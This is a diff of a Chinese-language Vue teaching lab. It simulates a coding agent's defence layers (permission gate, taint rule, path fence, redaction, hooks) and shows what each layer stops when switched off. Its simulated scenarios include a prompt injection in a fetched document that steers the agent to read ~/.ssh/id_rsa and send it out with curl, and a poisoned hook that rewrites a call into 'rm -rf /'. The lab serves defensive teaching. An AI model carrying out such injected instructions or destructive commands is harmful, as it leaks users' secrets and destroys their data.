@@ -6,15 +6,32 @@
 <template>
   <LabFrame
     title="harness 的每一层 — 单独关掉一层, 看它原本挡住了什么"
-    sub="- 模拟什么: 一个 Claude Code 式的 agent 由两部分组成: 一个很薄的 loop (拼上下文, 问模型, 执行模型要调的工具, 把结果回填, 再循环), 和挂在 loop 周围的一圈确定性零件 (记忆、检索、hook、权限门、污点规则、路径围栏、脱敏、上下文瘦身), 这一圈叫 harness。这个台子取三个 demo 里的五个场景, 模型、工具、prompt 一个字不改, 只改挂了哪些零件, 看同一个场景会怎么收场。
-      - 图上是什么: 左边是 transcript, 就是模型眼里的这段对话, 一块一块按时间排: system 是 harness 塞进来的系统消息, tool_use 是模型要求调用工具, tool_result 是工具返回, final 是最终回答, (没有发起) 表示这一步因为前面被拦所以没发生; 每块右边的 +N tok 是它占多少上下文; 左边框的颜色绿是正常, 黄是警告, 红是出事了。右边九个大按钮是 harness 的九层, 每个按钮上有开关状态、这一层的名字和它在源码里的位置, 按钮下面的小字是它这一次挡住或改变了什么; 半透明的层表示当前场景不涉及它。
-      - 可以做什么: 最上面一排按钮切换五个场景: 搜索后写笔记、委托子智能体、rm -fr 被拒、hook 改写调用、文档夹带注入指令。点右边任意一层把它关掉或打开; 「全部打开」「全部关掉」一键切换, 旁边显示已关掉几层。「hook 改写调用」场景多一个「装了一个被污染的第三方 PreToolUse hook」开关, 它是攻击来源, 不算 harness 的一层。用播放器逐块回放 transcript。
-      - 应该看到: 默认场景是「文档夹带注入指令」, 全部打开时结局是「私钥没读到, 密钥已脱敏」。每关掉一层, 右边那一层的小字会说明少了它会怎样, 左边 transcript 跟着变。右侧「最终上下文」是这次运行一共占了多少 tok, 比全开时多就标红; 「真正到达执行层的危险动作」应该是 0; 「密钥原样落进会话日志 JSONL」是密钥有没有没经脱敏就写进日志; 「结局」一句话总结这次怎么收场, 红色就是出事了。试试关掉「路径围栏」「权限门」「污点规则」三层, 私钥才真的会被发到外网。"
+    sub="- 模拟什么: 这个台子取三个 demo 里的五个场景, 模型、工具、prompt 一个字不改, 只改挂了哪些零件, 看同一个场景会怎么收场。一个 Claude Code 式的 agent 由两部分组成:
+        - loop: 很薄的一层, 拼上下文, 问模型, 执行模型要调的工具, 把结果回填, 再循环。
+        - harness: 挂在 loop 周围的一圈确定性零件 (记忆、检索、hook、权限门、污点规则、路径围栏、脱敏、上下文瘦身)。
+      - 图上是什么: 左边是对话, 右边是 harness 的各层:
+        - 左边 transcript: 模型眼里的这段对话, 一块一块按时间排。system 是 harness 塞进来的系统消息, tool_use 是模型要求调用工具, tool_result 是工具返回, final 是最终回答, (没有发起) 表示这一步因为前面被拦所以没发生。
+        - 每块右边的 +N tok: 它占多少上下文。
+        - 每块左边框的颜色: 绿是正常, 黄是警告, 红是出事了。
+        - 右边九个大按钮: harness 的九层。每个按钮上有开关状态、这一层的名字和它在源码里的位置, 按钮下面的小字是它这一次挡住或改变了什么; 半透明的层表示当前场景不涉及它。
+      - 可以做什么: 按界面顺序:
+        - 最上面一排按钮: 切换五个场景, 搜索后写笔记、委托子智能体、rm -fr 被拒、hook 改写调用、文档夹带注入指令。
+        - 「全部打开」「全部关掉」: 一键切换, 旁边显示已关掉几层。
+        - 「hook 改写调用」场景: 多一个「装了一个被污染的第三方 PreToolUse hook」开关, 它是攻击来源, 不算 harness 的一层。
+        - 播放器: 逐块回放 transcript。
+        - 点右边任意一层: 把它关掉或打开。
+      - 应该看到: 默认场景是「文档夹带注入指令」, 全部打开时结局是「私钥没读到, 密钥已脱敏」。现象和右侧读数:
+        - 每关掉一层: 右边那一层的小字会说明少了它会怎样, 左边 transcript 跟着变。
+        - 右侧「最终上下文」: 这次运行一共占了多少 tok, 比全开时多就标红。
+        - 「实际到达执行层的危险动作」: 应该是 0。
+        - 「密钥原样落进会话日志 JSONL」: 密钥有没有没经脱敏就写进日志。
+        - 「结局」: 一句话总结这次怎么收场, 红色就是出事了。
+        - 试试关掉「路径围栏」「权限门」「污点规则」三层, 私钥才会被发到外网。"
     :module="cur.module"
     :run="cur.run"
     :challenge="{
-      ask: '选「文档夹带注入指令」场景。先猜: 要关掉几层, 私钥才真的会被发到外网? 再点「全部关掉」, 看五个场景各自怎么收场。',
-      answer: '要关掉三层: 路径围栏、权限门、污点规则。它们互不依赖, 任何一层还在, 私钥都出不去。\n- 读私钥这一步有两道独立的检查: 权限门的 auto 分类器看 path 参数, 命中 .ssh / id_rsa 这类敏感路径就拒绝, 调用根本到不了执行层; 它被关掉后, 路径围栏在工具内部兜底, 先把 ../../.ssh/id_rsa 展开成真实路径, 发现已经跑出沙箱根目录, 报错。两层都关, 私钥才读得出来。\n- 读出来之后还要发出去: 污点规则规定本轮上下文里一旦混入过不可信数据 (抓回来的文档), 高风险工具 (shell) 一律拒绝, 不管模型是不是上当了。它也关掉, curl 才发得出去。\n这就是纵深防御: 每一层都假设别的层会失守。各层性质不同:\n- 概率性防御: untrusted_data 标记和注入特征检测, 只是在「劝」模型别听文档里的指令, 换个说法就能绕过去。\n- 确定性防御: 污点规则、路径围栏、deny 规则, 不看模型怎么想。一个系统里至少要有一层是后者。\n点「全部关掉」再看五个场景: rm -rf / 真的到了执行层, 私钥外泄, 密钥原样落进 JSONL, 笔记还记错了文档。而模型、工具和 prompt 从头到尾没变过。',
+      ask: '选「文档夹带注入指令」场景。先猜: 要关掉几层, 私钥才会被发到外网? 再点「全部关掉」, 看五个场景各自怎么收场。',
+      answer: '要关掉三层: 路径围栏、权限门、污点规则。它们互不依赖, 任何一层还在, 私钥都出不去。\n- 读私钥这一步有两道独立的检查, 两层都关, 私钥才读得出来:\n  - 权限门: auto 分类器看 path 参数, 命中 .ssh / id_rsa 这类敏感路径就拒绝, 调用到不了执行层。\n  - 路径围栏: 权限门被关掉后, 它在工具内部兜底, 先把 ../../.ssh/id_rsa 展开成真实路径, 发现已经跑出沙箱根目录, 报错。\n- 读出来之后还要发出去: 污点规则规定本轮上下文里一旦混入过不可信数据 (抓回来的文档), 高风险工具 (shell) 一律拒绝, 不管模型有没有照着注入的指令做。它也关掉, curl 才发得出去。\n这种做法叫纵深防御: 每一层都假设别的层会失守。各层性质不同:\n- 概率性防御: untrusted_data 标记和注入特征检测, 只是在「劝」模型别听文档里的指令, 换个说法就能绕过去。\n- 确定性防御: 污点规则、路径围栏、deny 规则, 不看模型怎么想。一个系统里至少要有一层是后者。\n点「全部关掉」再看五个场景:\n- rm -rf / 到了执行层。\n- 私钥外泄。\n- 密钥原样落进 JSONL。\n- 笔记还记错了文档。\n这几次运行的模型、工具和 prompt 都一样。',
     }"
   >
     <template #controls>
@@ -55,11 +72,18 @@
 
     <template #stats>
       <div class="kv"><span>最终上下文 (这次运行占了多少)</span><b :class="sim.ctx > base.ctx ? 'bad' : ''">{{ sim.ctx }} tok</b></div>
-      <div class="kv"><span>真正到达执行层的危险动作</span><b :class="sim.danger ? 'bad' : 'good'">{{ sim.danger }}</b></div>
+      <div class="kv"><span>实际到达执行层的危险动作</span><b :class="sim.danger ? 'bad' : 'good'">{{ sim.danger }}</b></div>
       <div class="kv"><span>密钥原样落进会话日志 JSONL</span><b :class="sim.leak ? 'bad' : 'good'">{{ sim.leak ? '是' : '否' }}</b></div>
       <div class="kv"><span>结局</span><b :class="sim.bad ? 'bad' : 'good'">{{ sim.outcome }}</b></div>
       <div class="lab-note">
-        <p>loop 本身从头到尾没变: 每一轮先拼上下文, 问模型; 模型要调工具时依次经过 PreToolUse hook、污点检查、权限门、参数校验, 然后执行, 最后把结果回填进上下文。变的只是这条路上还挂着几个零件。</p>
+        <p>loop 本身从头到尾没变, 每一轮:</p>
+        <ol class="pts">
+          <li>先拼上下文, 问模型。</li>
+          <li>模型要调工具时依次经过 PreToolUse hook、污点检查、权限门、参数校验。</li>
+          <li>然后执行。</li>
+          <li>最后把结果回填进上下文。</li>
+        </ol>
+        <p>变的只是这条路上还挂着几个零件。</p>
         <p>「上下文瘦身」这一层管两件事:</p>
         <ul class="pts">
           <li>主上下文超预算时, 把旧的工具结果正文清成占位符 (memory.py:clear_tool_results), 零模型开销。</li>
@@ -138,14 +162,14 @@ function simulate(id, L, hasEvil) {
     steps.push({ k: 'use', tok: 22, text: 'delegate {"task":"调研 subagents","agent_type":"researcher"}' })
     N('gate', L.gate ? '父门先看 delegate 本身: risk=high, 命中 allow delegate 规则才放行 (full_loop 配了这一条); 本轮读过不可信数据时, 污点规则会先拦下它。子级里发生的事由子级自己的 PermissionGate("auto") 管。' : '关掉后: 父级对委托这个动作不再有任何裁决。', !L.gate)
     N('retrieval', '子 agent 的工具集里只有 VectorSearchTool: 它检索到 subagents 文档, 读了 279 tok, 全留在自己的上下文里。')
-    steps.push({ k: 'res', tok: L.compact ? 50 : 279, tone: L.compact ? 'ok' : 'bad', text: L.compact ? '[researcher] Subagents keep isolated transcripts and return a compact summary…  ← 硬截断到 200 字符' : '[researcher] (子级 4 条消息 279 tok 原样灌回父上下文) ← 隔离形同虚设' })
+    steps.push({ k: 'res', tok: L.compact ? 50 : 279, tone: L.compact ? 'ok' : 'bad', text: L.compact ? '[researcher] Subagents keep isolated transcripts and return a compact summary…  ← 硬截断到 200 字符' : '[researcher] (子级 4 条消息 279 tok 原样灌回父上下文) ← 隔离失效' })
     N('compact', L.compact ? '摘要在 harness 侧硬截断到 200 字符: 子级再啰嗦也淹不了父上下文, 不依赖它"自觉写短"。' : '关掉上限后: 子级读到的全文顺着摘要回流。父级峰值上下文不再小于子级, 委托白委托了。', !L.compact)
     N('redact', L.redact ? '护栏跟着下传: DelegateTool(guardrails=…) 让子级读到的内容一样脱敏、一样包 <untrusted_data>。' : '关掉后: 子级读到的密钥会顺着摘要进父 transcript, 再落进 JSONL。', !L.redact)
     if (L.hook) { steps.push({ k: 'sys', tok: 6, text: 'subagent_stop: researcher  ← 父级审计得到子级收尾的记录' }); N('hook', 'SubagentStop 让父级知道每个子级什么时候结束、交回了什么。子 transcript 单独落盘 child_00_researcher.jsonl。') }
     else N('hook', '关掉后: 子级悄悄跑完悄悄结束, 父级只有一条摘要, 没有收尾记录。', true)
     leak = !L.redact
     bad = !L.compact || !L.redact
-    outcome = bad ? '隔离被打穿' : '父级只多一条摘要'
+    outcome = bad ? '隔离失效' : '父级只多一条摘要'
   }
 
   if (id === 'rm') {
@@ -170,7 +194,7 @@ function simulate(id, L, hasEvil) {
       if (blocked) steps.push({ k: 'res', tok: 5, tone: 'ok', text: 'DENIED: destructive  ← 门评估的是改写后的那个调用' })
       else { danger++; steps.push({ k: 'res', tok: 6, tone: 'bad', text: `simulated shell: rm -rf /  ← 到了执行层。${L.gate ? '门刚才看的是 calculator' : '没有门'}` }) }
       N('gate', !L.gate ? '关掉后: 改写出来的 rm -rf / 没有任何人检查。' : L.recheck ? 'deny 规则 shell "*rm -rf*" 命中改写后的调用。' : '门放行的是 calculator。deny 规则还在, 但它没见到 rm -rf /。', !blocked)
-      N('recheck', L.recheck ? '顺序是 hook → 权限门 → 执行: 门评估 final 而不是 call, 改写绕不过 deny 规则。hook 是模型之外 100% 执行的确定性代码, 能拦截、能改写、能追加上下文。正因为能改写, 它不能成为提权通道。' : '关掉后顺序变成 权限门 → hook → 执行: 门放行了 calculator, 执行的却是 rm -rf /。检查之后还能被修改的东西等于没检查 (TOCTOU)。', !L.recheck)
+      N('recheck', L.recheck ? '顺序是 hook → 权限门 → 执行: 门评估 final 而不是 call, 改写绕不过 deny 规则。hook 是模型之外 100% 执行的确定性代码, 能拦截、能改写、能追加上下文。它能改写调用, 所以门必须看改写后的结果, 否则 hook 就成了提权通道。' : '关掉后顺序变成 权限门 → hook → 执行: 门放行了 calculator, 执行的却是 rm -rf /。检查之后还能被修改的东西等于没检查 (TOCTOU)。', !L.recheck)
     }
     bad = danger > 0
     outcome = danger ? 'rm -rf / 到了执行层' : hasEvil ? '改写后的调用被拦住' : '正常算出 4'
@@ -194,7 +218,7 @@ function simulate(id, L, hasEvil) {
       steps.push({ k: 'res', tok: 10, tone: sendOk ? 'bad' : 'ok', text: sendOk ? 'simulated shell: curl -d @id_rsa …  ← 私钥发出去了' : 'DENIED: context is tainted by untrusted data; high-risk tools are locked this turn' })
     }
     if (sendOk) danger++
-    N('taint', !L.taint ? '关掉后: 模型上当就真能得手。标记和注入特征检测只是在"劝"模型, 换个说法就绕过去了。' : `${readOk ? '' : '这次没轮到它: 私钥没读到, curl 没有发起。'}本轮上下文一旦混入不可信数据, 高风险工具一律拒绝。这是确定性的, 与模型是否上当无关, 连配过的 allow 规则也救不了。下一条真正的用户指令才重置。`, !L.taint)
+    N('taint', !L.taint ? '关掉后: 模型照着注入的指令去做, 私钥就能发出去。标记和注入特征检测只是在"劝"模型, 换个说法就绕过去了。' : `${readOk ? '' : '这次没轮到它: 私钥没读到, curl 没有发起。'}本轮上下文一旦混入不可信数据, 高风险工具一律拒绝。这是确定性的, 与模型是否听从注入指令无关, 配过的 allow 规则也不能放行。下一条真正的用户指令才重置。`, !L.taint)
     N('gate', L.gate ? 'auto 分类器看 path 参数: 命中敏感路径 (.ssh / id_rsa), 读私钥被拒。shell 的 command 里出现 curl, 它也会拒。' : '关掉后: 读私钥少了一道独立检查, 只剩路径围栏。', !L.gate)
     leak = !L.redact
     bad = readOk || leak
